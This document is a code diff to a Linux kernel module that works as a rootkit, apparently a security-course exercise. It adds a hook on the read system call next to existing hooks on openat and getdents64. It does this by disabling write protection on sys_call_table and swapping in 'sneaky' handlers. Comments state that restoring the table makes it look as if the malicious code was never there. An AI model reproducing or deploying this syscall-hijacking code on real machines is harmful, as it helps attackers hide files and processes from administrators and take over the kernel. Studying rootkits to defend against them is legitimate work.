@@ -1,7 +1,8 @@
 #include <asm/cacheflush.h>
 #include <asm/current.h>  // process information
 #include <asm/page.h>
-#include <asm/unistd.h>     // for system call constants
+#include <asm/unistd.h>  // for system call constants
+#include <asm/unistd_64.h>
 #include <linux/highmem.h>  // for changing page permissions
 #include <linux/init.h>     // for entry/exit macros
 #include <linux/kallsyms.h>
@@ -87,6 +88,12 @@ asmlinkage int sneaky_getdents64(struct pt_regs * regs) {
   return nread;
 }
 
+asmlinkage ssize_t (*original_read)(struct pt_regs * regs);
+
+asmlinkage ssize_t sneaky_read(struct pt_regs * regs) {
+  return original_read(regs);
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void) {
   // See /var/log/syslog or use `dmesg` for kernel print output
@@ -101,6 +108,7 @@ static int initialize_sneaky_module(void) {
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
   original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+  original_read = (void *)sys_call_table[__NR_read];
 
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
@@ -108,6 +116,7 @@ static int initialize_sneaky_module(void) {
   // You need to replace other system calls you need to hack here
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)sneaky_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
@@ -125,6 +134,7 @@ static void exit_sneaky_module(void) {
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+  sys_call_table[__NR_read] = (unsigned long)original_read;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
